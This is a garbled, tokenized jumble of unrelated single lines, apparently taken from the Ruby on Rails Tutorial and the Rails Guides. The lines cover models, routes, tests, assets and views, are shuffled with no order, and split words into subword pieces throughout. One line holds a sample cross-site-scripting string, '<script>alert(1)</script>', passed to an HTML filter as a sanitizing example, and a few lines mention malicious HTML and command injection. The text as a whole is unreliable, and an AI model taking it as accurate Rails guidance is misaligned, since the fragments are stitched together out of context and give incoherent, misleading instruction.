▁Before ▁mov ing ▁on , ▁be ▁sure ▁to ▁merge ▁all ▁the ▁changes ▁into ▁the ▁master ▁branch :
▁Here ▁\ k ode { user ▖ save } ▁returns ▁\ k ode { false }, ▁indicat ing ▁a ▁failed ▁save .
▁def ▁index
▁< head >
▁# ▁< id ▁type =" integer "> 19 0 3 16 </ id >
▁ Validations ▁with ▁# ▁some ▁< tt > : on </ tt >
▁ W h y ▁do ▁you ▁have ▁to ▁both er ?
▁As sum ing ▁you ▁did n ' t ▁make ▁the ▁same ▁implementation ▁mistake ▁I ▁did , ▁the ▁tests ▁should ▁be ▁\ passing :
▁A ▁\ k ode { create } ▁action ▁that ▁can ▁handle ▁signup ▁failure .
▁ global - 9 08 e 25 f 4 b f 64 1 868 d 868 3022 a 5 b 6 2 f 5 4 ▖ css
▁This ▁notation ▁actually ▁started ▁as ▁an ▁extension ▁Rails ▁made ▁to ▁the ▁ core ▁Ruby ▁language ; ▁it ▁was ▁so ▁useful ▁that ▁it ▁has ▁now ▁been ▁incorporate d ▁into ▁Ruby ▁itself .
▁Defaults ▁to ▁` true ` ▖
▁Let ' s ▁see ▁an ▁example .
▁# ▁=> ▁{" a " =>1 }
▁@ account ▁= ▁@ supplier ▖ create _ account ( term s : ▁" Net ▁30 ")
▁d ▖ prev _ week ▁# ▁=> ▁Mon , ▁2 6 ▁Apr ▁2010
▁in ▁Listing ~\ ref { code : users _ migration } .
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁A ▁few ▁things ▁are ▁going ▁on ▖
▁You ▁can ▁use ▁the ▁[ rubyonrails - core ▁mail ing ╼ list ]( http :// groups ▖ google ▖ com / group / rubyonrails - core / ) ▁for ▁this ▖
▁This ▁uses ▁the ▁a wesome ▁\ k ode { time \_ ago \_ in \_ words } ▁helper ▁method , ▁who se ▁meaning ▁is ▁ probably ▁clear ▁and ▁who se ▁effect ▁we ▁will ▁see ▁in ▁Section ~\ ref { sec : sample _ microposts } .
▁This ▁is ▁brittle , ▁though , ▁because ▁now ▁any ▁t y po ▁in ▁the ▁base ▁title ▁( such ▁as ▁`` Ruby ▁on ▁Rails ▁T u to i al '') ▁won ' t ▁be ▁c a ug h t ▁by ▁the ▁test ▁suite .
▁Database ▁ po ol ing
▁This ▁suggest s ▁defin ing ▁an ▁\ k ode { integration \_ test ?}\ ▁boolean ▁method ▁and ▁writing ▁an ▁if - the n ▁statement ▁schematic ally ▁as ▁follows :
▁If ▁you ▁want ed ▁to ▁link ▁to ▁just ▁a ▁ magazine :
▁Here ▁we ' ve ▁used ▁\ k ode { params } ▁to ▁retrieve ▁the ▁user ~ id .
▁ / sessions
▁The ▁response ▁will ▁be :
▁If ▁the ▁call ▁to ▁` update ` ▁fails , ▁calling ▁the ▁` update ` ▁action ▁in ▁this ▁controller ▁will ▁render ▁the ▁` edit ▖ html ▖ erb ` ▁template ▁ belonging ▁to ▁the ▁same ▁controller .
▁But ▁it ' s ▁the ▁proper ▁place ▁to ▁discuss ▁new ▁idea s ▖
▁Rails ▁4▖0 ▁remove s ▁the ▁` j ` ▁alias ▁for ▁` ERB :: Util # json _ escape ` ▁since ▁` j ` ▁is ▁already ▁used ▁for ▁` ActionView :: Helpers :: JavaScript Helper # escape _ javascript ` .
▁</ aside >
▁orders ▖ size
▁xml ▖ h 1 (@ person ▖ name )
▁Ou r ▁plan ▁for ▁testing ▁the ▁layout ▁links ▁involve s ▁check ing ▁the ▁HTML ▁structure ▁of ▁our ▁site :
▁first _ name : ▁' does ▁not ▁exist '
▁And ▁start ▁the ▁server :
▁C url y ▁braces ▁are ▁one ▁way ▁to ▁indicate ▁a ▁block , ▁but ▁there ▁is ▁a ▁second ▁way ▁as ▁well :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : users _ resource }
▁The ▁code ▁in ▁Listing ~\ ref { code : microposts _ resource } ▁lead s ▁in ▁turn ▁to ▁the ▁RESTful ▁routes ▁show n ▁in ▁Table ~\ ref { table : RESTful _ microposts }, ▁which ▁is ▁a ▁small ▁ subset ▁of ▁the ▁full ▁set ▁of ▁routes ▁seen ▁in ▁Table ~\ ref { table : demo _ RESTful _ microposts } .
▁We ' ll ▁also ▁give ▁our ▁\ emph { code } ▁some ▁styling , ▁so ▁to ▁ speak , ▁using ▁\ emph { partial s } ▁to ▁t id y ▁up ▁the ▁layout ▁once ▁it ▁get s ▁a ▁little ▁ clu tt er ed .
▁This ▁test ▁uses ▁the ▁\ k ode { reload } ▁method ▁for ▁ reload ing ▁a ▁value ▁from ▁the ▁database ▁and ▁the ▁\ k ode { assert \_ equal } ▁method ▁for ▁testing ▁equal ity .
▁The ▁` find _ or _ create _ by ` ▁method ▁check s ▁whether ▁a ▁record ▁with ▁the ▁attributes ▁exists ▖
▁ Allow ing ▁empty ▁passwords ▁on ▁update ▖
▁@ current _ user ▁ ||= ▁User ▖ find _ by ( id : ▁session [: user _ id ])
▁De s p ite ▁appearance s , ▁this ▁is ▁\ emph { not } ▁a ▁compar is on ▁( which ▁would ▁use ▁double - equal s ▁\ k ode {==} ), ▁but ▁rather ▁is ▁an ▁\ emph { assignment } .
▁To ▁set ▁asset ▁compression ▁methods , ▁set ▁the ▁appropriate ▁configuration ▁options ╼ in ▁` production ▖ rb ` ▁- ▁` config ▖ assets ▖ css _ compressor ` ▁for ▁your ▁CSS ▁and ╼` config ▖ assets ▖ js _ compressor ` ▁for ▁your ▁JavaScript :
▁Using ▁ ORM , ▁the ▁ properties ▁and ╼ relationships ▁of ▁the ▁objects ▁in ▁an ▁application ▁can ▁be ▁easily ▁store d ▁and ╼ re t ri e ve d ▁from ▁a ▁database ▁without ▁writing ▁SQL ▁statement s ▁directly ▁and ▁with ▁less ╼ over all ▁database ▁access ▁code .
▁<%= ▁f ▖ label ▁: comment er ▁%>< br >
▁A lthough ▁we ▁could ▁use ▁SSL ▁on ▁just ▁the ▁signup ▁page , ▁it ' s ▁actually ▁easier ▁to ▁implement ▁it ▁site - wide , ▁which ▁has ▁the ▁ additional ▁benefit s ▁of ▁ sec ur ing ▁user ▁login ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) ▁and ▁making ▁our ▁application ▁ im m un e ▁to ▁a ▁ critical ▁\ emph { session ▁hijacking } ▁ vulnerabilit y ▁discuss ed ▁in ▁Section ~\ ref { sec : remember _ me } .
▁If ▁you ▁have ▁to ▁store ▁complex ▁objects , ▁you ▁would ▁need ▁to ▁handle ▁the ▁con version ╼ man u ally ▁when ▁reading ▁the ▁values ▁on ▁subsequent ▁requests .
▁ sanitize ▁@ article ▖ body , ▁tags : ▁% w ( table ▁ tr ▁ td ), ▁attributes : ▁% w ( id ▁class ▁style )
▁The ▁first ▁new ▁example ▁is ▁just ▁a ▁sanit y ▁check , ▁verify ing ▁that ▁the ▁subject ▁(\ k ode {@ user }) ▁is ▁initially ▁valid :
▁Tue , ▁31 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁ Regexp ▖ new (' ▖ ')▖ multiline ?
▁╼╼\ begin { ve rb at im }
▁Even ▁with ▁hint s , ▁they ▁are ▁\ emph { much } ▁more ▁difficult ▁than ▁the ▁book ' s ▁end - of - chapter ▁ exercises , ▁so ▁don ' t ▁be ▁di s c our age d ▁if ▁you ▁can ' t ▁solve ▁them ▁without ▁consider able ▁effort .
▁When ▁you ▁alter ▁a ▁template , ▁Rails ▁will ▁check ▁the ▁file ' s ▁modification ▁time ▁and ▁re compile ▁it ▁in ▁development ▁mode .
▁To ▁do ▁this , ▁you ▁need ▁to ╼ get ▁your ▁Rails ▁application ▁server ▁running .
▁Here ' s ▁how ▁this ▁could ▁be ▁declare d :
▁The ▁` collection ▖ where ` ▁method ▁find s ▁objects ▁within ▁the ▁collection ▁base d ▁on ▁the ▁conditions ▁supplied ▁but ▁the ▁objects ▁are ▁loaded ▁ la z ily ▁meaning ▁that ▁the ▁database ▁is ▁ q ue ri ed ▁only ▁when ▁the ▁object ( s ) ▁are ▁access ed ▖ ╼╼
▁Pages ▁to ▁display ▁followed ▁users ▁and ▁followers ▁will ▁resembl e ▁a ▁ hybrid ▁of ▁the ▁user ▁profile ▁page ▁and ▁the ▁user ▁index ▁page ▁( Section ~\ ref { sec : users _ index }), ▁with ▁a ▁ sidebar ▁of ▁user ▁information ▁( including ▁the ▁following ▁ stats ) ▁and ▁a ▁list ▁of ▁users .
▁( This ▁code ▁is ▁a ▁particular ly ▁ugly ▁combination ▁of ▁HTML ▁and ▁ ERb ; ▁making ▁it ▁pre tt i er ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises })▖)
▁### ▁` multiline ?
▁To ▁ answer ▁these ▁ questions , ▁we ▁need ▁to ▁learn ▁how ▁to ▁use ▁Active ▁Record ▁to ▁find ▁user ▁objects .
▁By ▁the ▁way , ▁it ' s ▁worth ▁noting ▁( since ▁you ▁may ▁see ▁other ▁people ▁use ▁it ) ▁that ▁you ▁can ▁also ▁run ▁the ▁test ▁suite ▁using ▁the ▁\ k ode { spec } ▁Rake ▁task :
▁# ▁gem ▁' guard - rspec ', ▁' 2▖ 5▖0 '
▁The ▁result ▁of ▁ submitting ▁a ▁valid ▁email ▁address .
▁For ▁namespaced ▁controllers ▁you ▁can ▁use ▁the ▁directory ▁notation ▖
▁The ▁current ▁state ▁of ▁the ▁signup ▁page ▁\ href { http ://0▖0▖0▖0:3000/ signup }{/ signup } .
▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful } .
▁If ▁you ▁don ' t ▁already ▁have ▁it , ▁you ▁should ▁\ href { http :// rubygems ▖ org / pages / download } { download ▁ RubyGems }, ▁ extract ▁it , ▁and ▁then ▁go ▁to ▁the ▁\ k ode { rubygems } ▁directory ▁and ▁run ▁the ▁setup ▁program :
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁As ▁in ▁Section ~\ ref { sec : layout _ link _ tests }, ▁we ' ll ▁use ▁\ k ode { assert \_ select } ▁to ▁test ▁HTML ▁elements ▁of ▁the ▁relevant ▁pages , ▁tak ing ▁care ▁to ▁check ▁only ▁elements ▁unlike ly ▁to ▁change ▁in ▁the ▁future .
▁As ▁noted ▁brief ly ▁in ▁Section ~\ ref { sec : the _ first _ application }, ▁Bundler ▁is ▁run ▁automatically ▁( via ▁\ k ode { bundle ▁install }) ▁by ▁the ▁\ k ode { rails } ▁command , ▁but ▁in ▁this ▁section ▁we ' ll ▁make ▁some ▁changes ▁to ▁the ▁default ▁application ▁gems ▁and ▁run ▁Bundler ▁again .
▁#### # ▁` seconds _ since _ midnight `
▁If ▁you ▁were ▁to ▁use ▁this ▁inside ▁an ▁engine , ▁it ▁would ▁** al way s ** ▁go ▁to ▁the ╼ application ' s ▁root ▖
▁It ' s ▁necessary ▁not ▁to ▁set ▁or ▁leave ▁`: nullify ` ▁option ▁for ▁those ▁associations ╼ that ▁have ▁` NOT ▁NULL ` ▁database ▁constraints ▖
▁TIP : ▁If ▁you ▁find ▁yourself ▁adding ▁many ▁extra ▁actions ▁to ▁a ▁resource ful ▁route , ▁it ' s ▁time ▁to ▁stop ▁and ▁as k ▁yourself ▁whether ▁you ' re ▁di s g u is ing ▁the ▁presence ▁of ▁another ▁resource .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ relationships _ association } .
▁ /* ╼ ▁* ▁------------ ---------------- ---------------- ---------------- ---------------- ╼ ▁* ▁" THE ▁B E ER W A RE ▁L I C E N SE " ▁( R evi s ion ▁4 3 ) : ╼ ▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code .
▁def ▁ products _ layout
▁Under ▁certain ▁c irc um st ance s ▁this ▁would ▁present ▁the ▁ malicious ▁HTML ▁to ▁the ▁victim ▖
▁There ▁exist ▁two ▁options ▁for ▁` scope ` ▁to ▁customize ▁ shallow ▁routes ▖
▁The ▁first ▁is ╼ mov ing ▁the ▁files ▁from ▁` public / ` ▁to ▁the ▁new ▁location s ▖
▁# ▁< contributors ▁type =" array ">
▁Listing ~\ ref { code : micropost _ order _ test } ▁relie s ▁on ▁ having ▁some ▁micropost ▁fixtures , ▁which ▁we ▁define ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ fixtures } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / load _ error ▖ rb ` .
▁This ▁would ▁produce ▁the ▁following ▁header :
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁generate ▁scaffold ▁code ▁for ▁the ▁Microposts ▁resource ▁using ▁\ k ode { rails ▁generate ▁scaffold }, ▁in ▁this ▁case ▁implement ing ▁the ▁data ▁model ▁from ▁Figure ~\ ref { fig : demo _ micropost _ model }
▁Provide s ▁methods ▁for ▁convert ing ▁number s ▁into ▁ formatted ▁strings ▖
▁create ▁app / helpers / static _ pages _ helper ▖ rb
▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁\ passing \ ▁before ▁proceeding :
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ▁end ed ▁with ▁a ▁ stub ▁page ▁for ▁creating ▁new ▁users ▁( Section ~\ ref { sec : user _ signup }) .
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁Bootstrap , ▁which ▁in ▁Rails ▁applications ▁can ▁be ▁accomplish ed ▁with ▁the ▁\ text tt { bootstrap - sass } ▁gem , ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ sass } .
▁ Cl ic k ▁around !
▁* ▁How ▁to ▁use ▁the ▁built - in ▁Active ▁Record ▁validation ▁helpers .
▁ ec tion { E x er ci s es }╼\ label { sec : exercises _ remember _ me }╼╼\ input { fragments / so ci e t y _ exercises _ note }╼╼\ begin { enumerate } ╼ ▁\ item ▁By ▁ inspect ing ▁your ▁browser ' s ▁cookies ▁directly , ▁verify ▁that ▁the ▁`` remember ▁me '' ▁checkbox ▁is ▁ having ▁its ▁intend ed ▁effect ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 c 1 e 9 6 ' ></ span >╼╼ ▁\ item ▁At ▁the ▁console , ▁in v ent ▁examples ▁ showing ▁both ▁possible ▁behavior s ▁of ▁the ▁ ternary ▁operator ▁( Bo x ~\ ref { aside : ternary _ o p er at or }) ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 3 ac 7 3 ' ></ span >╼ \ end { enumerate } ╼╼% ▁section ▁remember _ me ▁( end )╼╼ \ section { Remember ▁tests } ▁% ▁( fold )╼\ label { sec : remember _ tests }╼╼
▁With out ▁associations , ▁the ▁model ▁declaration s ▁would ▁look ▁like ▁this :
▁ RedCloth ▖ new (' < script > alert (1) </ script > ', ▁ [: filter _ html ]) ▖ to _ html
▁When ▁queries ▁are ▁executed ▁on ▁this ▁model , ▁the ▁SQL ▁query ▁will ▁now ▁look ▁something ▁like ╼ this :
▁Here , ▁we ▁expect ▁it ▁to ▁be ▁more ▁complicated , ▁something ▁like ▁this :
▁The ▁way ▁to ▁do ▁this ▁is ▁with ▁the ▁\ k ode { cookies } ▁method , ▁which ▁( as ▁with ▁\ k ode { session }) ▁we ▁can ▁treat ▁as ▁a ▁hash .
▁If ▁this ▁example ▁ st ri k es ▁you ▁as ▁a ▁bit ▁con tr ive d , ▁good --- this ▁is ▁by ▁design .
▁# ▁T ry ▁to ▁log ▁in ▁before ▁activation .
▁scope ▁: created _ before , ▁-> ( time ) ▁ { ▁where (" created _ at ▁< ▁? ", ▁time ) ▁ }
▁The ▁`: before ` ▁key ▁in ▁the ▁options ▁hash ▁can ▁be ▁specified ▁to ▁specify ▁which ▁initializer ▁this ▁new ▁initializer ▁must ▁run ▁before , ▁and ▁the ▁`: after ` ▁key ▁will ▁specify ▁which ▁initializer ▁to ▁run ▁this ▁initializer ▁ _ after _ .
▁mail ( to : ▁user ▖ email ) ▁do ▁| format |
▁They ▁are ▁design ed ▁to ▁be ▁a ▁sanit y ▁check , ▁not ▁to ▁be ▁ com pre h en s ive .
▁Using ▁` render ▁: text ` ▁may ▁ po se ▁a ▁security ▁risk , ▁as ▁the ▁content ▁is ▁sent ▁as ╼` text / html ` .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁2, ▁7 , ▁ 8, ▁and ▁10 .
▁U nfortunately , ▁the ▁User ▁request ▁ spec ▁is ▁now ▁broken ▁because ▁the ▁signup ▁and ▁edit ▁forms ▁use ▁the ▁old ▁version ▁of ▁the ▁error ▁messages ▁partial .
▁< img ▁src =' http :// us ▖ i 1 ▖ y img ▖ com / us ▖ y img ▖ com / i / us / nt / ma / ma _ mail _ 1 ▖ g if '
▁Instead ▁of ▁return ing ▁a ▁path ▁such ▁as ▁` / assets / s m ile ▖ png ` ▁( digest s ▁are ▁left ▁out ╼ for ▁read ability )▖
▁You ▁should ▁also ▁update ▁your ▁application ╼ file ▁( in ▁` config / application ▖ rb ` ) :
▁The ▁\ k ode { rails ▁new } ▁command ▁automatically ▁generates ▁a ▁\ k ode { ▖ gitignore } ▁file ▁appropriate ▁to ▁a ▁Rails ▁project , ▁but ▁you ▁can ▁add ▁ additional ▁pattern s ▁as ▁well
▁Note ▁that ▁the ▁Rails ▁generator ▁automatically ▁ append s ▁\ k ode { \_ test } ▁to ▁the ▁name ▁of ▁the ▁test ▁file .
▁Rails ▁will ▁then ▁output ▁a ▁` script ` ▁tag ▁such ▁as ▁this :
▁" "▖ html _ safe ▁+ ▁"< "▖ html _ safe ▁# ▁=> ▁"< "
▁Creat ing ▁a ▁ demo ▁app ▁repository ▁at ▁GitHub ▖ ~\ href { http :// railstutorial ▖ org / images / figures / create _ demo _ repo _4_0 - full ▖ png }{( full ▁size )}
▁@ book ▁= ▁ Book ▖ find ( params [: id ])
▁ V a ri able ▁title
▁The ▁order ▁in ▁which ▁helpers ▁from ▁more ▁than ▁one ▁directory ▁are ▁loaded ▁has ▁changed ▁in ▁Rails ▁4▖0 ▖
▁=> ▁Call ▁with ▁- d ▁to ▁ de t a ch
▁\ emph { Ruby ▁on ▁Rails ▁Tutorial : ▁ Learn ▁Web ▁Development ▁with ▁Rails } .
▁The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers .
▁create ▁ spec / models / user _ spec ▖ rb
▁* ▁`: re strict _ with _ exception ` ▁cause s ▁an ▁exception ▁to ▁be ▁raised ▁if ▁there ▁is ▁an ▁ associated ▁record
▁| ▁PATCH / PUT ▁| ▁ / geocoder ▁| ▁ geocoder s # update ▁| ▁update ▁the ▁one ▁and ▁only ▁ geocoder ▁resource ▁|
▁Here ▁the ▁connection ▁information ▁in ▁` ENV [' DAT A BASE _ URL ']` ▁is ▁ignore d , ▁note ▁the ▁different ▁adapter ▁and ▁database ▁name .
▁users ▁= ▁User ▖ all
▁ Show ing ▁the ▁users ▁the ▁given ▁user ▁is ▁following .
▁X ▁= ▁: in _ M
▁For ▁a ▁date d ▁but ▁ still ▁useful ▁discussion ▁of ▁this ▁issue , ▁see ▁the ▁\ href { http :// blog ▖ has many through ▖ com / 2008 / 4/ 2 / simple - pages } { simple ▁pages ▁post ▁on ▁has many through } .
▁<%= ▁ ex p en s ive _ file s _ o p er ation ▁%>
▁Rails ▁will ▁now ▁ prepend ▁"/ app 1 " ▁when ▁ generating ▁links .
▁With ▁the ▁data ▁ modeling ▁complete , ▁we ' re ▁now ▁ready ▁to ▁add ▁the ▁code ▁needed ▁to ▁send ▁an ▁account ▁activation ▁email .
▁As ▁you ▁can ▁verify ▁by ▁ inspect ing ▁the ▁navigation ▁in ▁your ▁browser , ▁once ▁Rails ▁has ▁processed ▁the ▁layout ▁and ▁evaluated ▁the ▁ embedded ▁Ruby ▁the ▁list ▁look s ▁like ▁this
▁Creat ing ▁an ▁issue ▁like ▁this ▁is ▁ mostly ▁to ▁help ▁yourself ▁start ▁on ▁the ▁path ▁of ▁fix ing ▁the ▁problem ▁and ▁for ▁other s ▁to ▁confirm ▁it ▁with ▁an ▁" I ' m ▁ having ▁this ▁problem ▁too " ▁comment .
▁* ▁`: nullify ` ▁cause s ▁the ▁foreign ▁key ▁to ▁be ▁set ▁to ▁` NULL ` ▖
▁if ▁@ article ▖ update ( article _ params )
▁* ▁Convert ▁the ▁supplied ▁options ▁to ▁an ▁equivalent ▁SQL ▁query .
▁The ▁ logout ▁link , ▁mean w h ile , ▁uses ▁the ▁ logout ▁path ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } :
▁That ▁seem s ▁to ▁me ▁a ▁ logical ▁ div is ion , ▁but ▁ putting ▁them ▁all ▁in ▁the ▁\ k ode { shared } ▁folder ▁certain ly ▁works ▁fine , ▁too .
▁This ▁means ▁the ▁methods ▁` sanitize `, ▁` sanitize _ css `, ▁` strip _ tags ` ▁and ╼` strip _ links ` ▁are ▁back ed ▁by ▁a ▁new ▁implementation .
▁# ▁@ business ▁and ▁@ user ▁instance ▁variables ▁here
▁belongs _ to ▁: customer , ▁ inverse _ of : ▁: orders
▁* ▁` config ▖ action _ dispatch ▖ t ld _ length ` ▁set s ▁the ▁T L D ▁( to p - level ▁domain ) ▁length ▁for ▁the ▁application ▖
▁This ▁means ▁that , ▁even ▁if ▁our ▁database ▁is ▁ com p r o mis ed , ▁our ▁users ' ▁passwords ▁will ▁ still ▁be ▁secure .
▁NOTE : ▁Whi le ▁these ▁column ▁names ▁are ▁optional , ▁they ▁are ▁in ▁fact ▁re serv ed ▁by ▁Active ▁Record ▖
▁data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? '
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 15 : 53 ▁GMT
▁### ▁Rails ▁ DOM ▁Testing
▁ INSERT ▁ IN T O ▁clients ▁( created _ at , ▁first _ name , ▁ locked , ▁orders _ count , ▁updated _ at ) ▁ V A L U E S ▁( ' 20 11-0 8 - 30 ▁ 05 : 22 : 57 ', ▁' Andy ', ▁1, ▁NULL , ▁' 20 11-0 8 - 30 ▁ 05 : 22 : 57 ')
▁\ chapter { Follow ing ▁users }╼\ label { cha : following _ users }╼╼
▁ / users /1/ followers
▁# ▁=> ▁ 123 - 555-1234
▁There ▁are ▁three ▁c a ve at s :
▁def ▁set _ author
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ ordering } .
▁### ▁CDN s
▁This ▁is ▁covered ▁in ▁ de p th ▁in ▁the ▁[ C on fig ur ing ▁ Middleware ](# configuring - middleware ) ▁section ▁below .
▁create ▁app / views / users / index ▖ json ▖ jbuilder
▁If ▁you ▁enter ▁a ▁wish ▁list ▁item ▁in ▁GitHub ▁ Issue s ▁with ▁no ▁code , ▁you ╼ can ▁expect ▁it ▁to ▁be ▁ marked ▁" invalid " ▁as ▁soon ▁as ▁it ' s ▁review ed .
▁Action ▁Mailer ▁ Callbacks
▁The ▁reason ▁is ▁that ▁the ▁engine ▁may ▁be ▁installed ▁as ▁a ╼ gem ▖
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4 ▖ 2▖2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁2▖ kilobyte s ▁# ▁=> ▁20 48
▁G ood ▁basic ▁tests ▁for ▁ signing ▁up ▁users .
▁< h 1> Name s ▁of ▁all ▁the ▁people </ h 1>
▁def ▁perform (* args )
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement : ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well ▁as ▁at ▁the ▁model ▁level .
▁It ▁is ▁very ▁easy ▁to ▁create ▁Active ▁Record ▁models ▖
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ .
▁ Addi tion ▁only ▁ assumes ▁the ▁elements ▁respond ▁to ▁` + `:
▁Defaults ▁to ▁` false ` ▁and ▁will ▁use ▁Active ▁Record ▁by ▁default .
▁C : \ Site s > ▁ echo ▁" hello , ▁world "
▁You ' ll ▁see ▁that ▁ Ryan ▁Bates ▁h im self ▁often ▁uses ▁ TDD ▁for ▁real - life ▁development , ▁and ▁in ▁fact ▁his ▁testing ▁style ▁is ▁similar ▁to ▁the ▁style ▁used ▁in ▁this ▁tutorial ▖)
▁Instead ▁of ▁as sum ing ▁all ▁public ▁methods ▁are ▁design ed ▁for ▁user ▁con sum p tion , ▁Rails ▁uses ▁the ▁`: no doc : ` ▁ directive ▁to ▁ annotate ▁these ▁kind s ▁of ▁methods ▁as ▁ internal ▁API .
▁The ▁tests ▁initially ▁fail , ▁as ▁required :
▁# ▁H and le ▁a ▁successful ▁update .
▁In ▁the ▁ early ▁day s ▁of ▁migrations , ▁the ▁filename s ▁were ▁prefix ed ▁with ▁ increment ing ▁ integer s , ▁which ▁cause d ▁conflicts ▁for ▁collaborat ing ▁team s ▁if ▁multiple ▁programmer s ▁ha d ▁migrations ▁with ▁the ▁same ▁number .
▁def ▁check _ credit _ limit ( order )
▁This ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator , ▁written ▁using ▁an ▁excl a m ation ▁point ~\ k ode { !} ▁and ▁usually ▁read ▁as ▁`` bang '' .
▁Of ▁course , ▁at ▁this ▁point ▁the ▁tests ▁should ▁fail :
▁The ▁Home ▁page ▁with ▁a ▁title .
▁To ▁duplicate ▁relative ly ▁simple ▁objects ▁such ▁as ▁arrays , ▁we ▁can ▁use ▁the ▁\ k ode { dup } ▁method :
▁Re le v an t ▁if ▁` config ▖ cache _ classes ` ▁is ▁false , ▁which ▁is ▁the ▁case ▁in ▁development ▁mode ▁by ▁default ▖
▁The ▁\ k ode { nav } ▁and ▁\ k ode { pull - right } ▁classes ▁on ▁the ▁\ k ode { ul } ▁tag ▁have ▁special ▁meaning ▁to ▁Bootstrap .
▁in ▁Listing ~\ ref { code : minimum _ password _ length _ test } .
▁class _ name : ▁" Order ",
▁# ▁Find ▁the ▁clients ▁with ▁primary ▁keys ▁1 ▁and ▁10 .
▁class _ name ▁= ▁name ▖ to _ s ▖ camelize
▁Create ▁a ▁new ▁file ▁` app / views / articles / _ form ▖ html ▖ erb ` ▁with ▁the ▁following ╼ content :
▁# ▁ label (: article , ▁: title )
▁See ▁the ▁Rails ▁G u ide ▁on ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ query ing ▖ html } { Active ▁Record ▁ Query ▁Interface } ▁for ▁more ▁on ▁\ k ode { where } ▁and ▁the ▁like .
▁* ▁` collection _ singular _ id s `
▁* ▁FROM ▁` users ` ▁ INNER ▁JOIN ▁` articles ` ▁ ON ▁` articles ` ▖ ` user _ id ` ▁= ▁` users ` ▖ ` id ` ▁WHERE ▁` users ` ▖ ` id ` ▁= ▁1
▁def ▁index
▁#### # ▁CDN s ▁and ▁the ▁ Cache - Control ▁Header
▁A ▁countermeasure ▁is ▁to ▁ _ use ▁the ▁` system ( command , ▁parameters ) ` ▁method ▁which ▁passes ▁command ▁line ▁parameters ▁ safe ly _ .
▁Using ▁Initialize r ▁File s
▁This ▁suggest s ▁ placing ▁the ▁method ▁in ▁\ k ode { user ▖ rb } .
▁The ▁reason ▁for ▁the ▁common ▁view ▁is ▁that ▁the ▁ ERb ▁is ▁ nearly ▁identical ▁for ▁the ▁two ▁cases , ▁and ▁Listing ~\ ref { code : show _ follow _ view } ▁cover s ▁them ▁both .
▁A lthough ▁Rails ▁is ▁design ed ▁for ▁making ▁database - back ed ▁dynamic ▁website s , ▁it ▁also ▁ ex c el s ▁at ▁making ▁the ▁kind ▁of ▁static ▁pages ▁we ▁m ight ▁make ▁with ▁raw ▁HTML ▁files .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ update _ action _ unsuccessful } .
▁This ▁is ▁one ▁of ▁the ▁most ╼ import an t ▁parts ▁about ▁name spacing , ▁and ▁is ▁discuss ed ▁later ▁in ▁the ╼[ R out es ](# routes ) ▁section ▁of ▁this ▁guide .
▁For ▁example , ▁if ╼ you ▁called ▁your ▁JavaScript ▁file ▁` app / assets / javascripts / projects ▖ js ▖ erb ▖ coffee `╼ the n ▁it ▁would ▁be ▁processed ▁with ▁the ▁CoffeeScript ▁interpret er ▁first , ▁which ╼ w o ul d n ' t ▁understand ▁ ERB ▁and ▁therefore ▁you ▁would ▁run ▁into ▁problem s .
▁Article ▖ where ( trashed : ▁true )▖ where ( trashed : ▁false )
▁When ▁we ▁last ▁left ▁the ▁Home ▁page , ▁it ▁appear ed ▁as ▁in ▁Figure ~\ ref { fig : sample _ app _ logo } --- that ▁is , ▁it ▁ha d ▁a ▁`` Sign ▁up ▁now !'' ▁button ▁in ▁the ▁m id d le .
▁Fin ally , ▁we ' ll ▁add ▁some ▁rules ▁to ▁style ▁the ▁site ' s ▁ logo , ▁which ▁simply ▁consist s ▁of ▁the ▁text ▁`` sample ▁app '' .
▁< p >
▁The ▁result ▁should ▁be ▁a ▁working ▁sample ▁application ▁on ▁the ▁production ▁server :
▁#### # ▁CDN ▁ Request ▁ Caching
▁### ▁Re mov ing ▁All ▁S co p ing
▁A c ce p t - Range s :
▁The ▁option ▁`: separator ` ▁can ▁be ▁a ▁ regex p :
▁We ' ll ▁implement ▁this ▁in ▁Listing ~\ ref { code : microposts _ home _ page } ▁below .
▁< script ▁src ="/ assets / application - 9 08 e 25 f 4 b f 64 1 868 d 868 3022 a 5 b 6 2 f 5 4 ▖ js "></ script >
